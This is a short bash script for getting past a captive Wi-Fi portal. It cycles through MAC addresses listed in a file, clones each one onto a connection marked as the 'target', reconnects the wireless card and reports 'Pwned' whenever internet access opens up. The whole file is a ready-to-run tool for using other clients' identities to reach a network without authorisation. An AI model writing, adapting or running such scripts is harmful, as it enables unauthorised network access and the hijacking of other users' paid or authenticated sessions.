#!/bin/bash

while read -r line; do
newmacset=$(echo ${line})
netmask=23
gateway="10.5.50.1"
broadcast="10.5.51.255"

nmcli con modify @captive_wifi wifi.cloned-mac-address ${newmacset}  #change your target wifi here
sleep 2
nmcli device disconnect wlan0    #change your wireless card here
sleep 10
nmcli device connect wlan0   #change your wireless card here
sleep 15

#check if internet connection is working or not
wget https://www.google.com/robots.txt -T 5 -t 1 -O /dev/null > /dev/null 2>&1
if [[ $? -eq 0 ]]; then
  echo "Pwned, ${newmacset}"
else
  echo "Passed, ${newmacset}"
fi

done < mac.txt
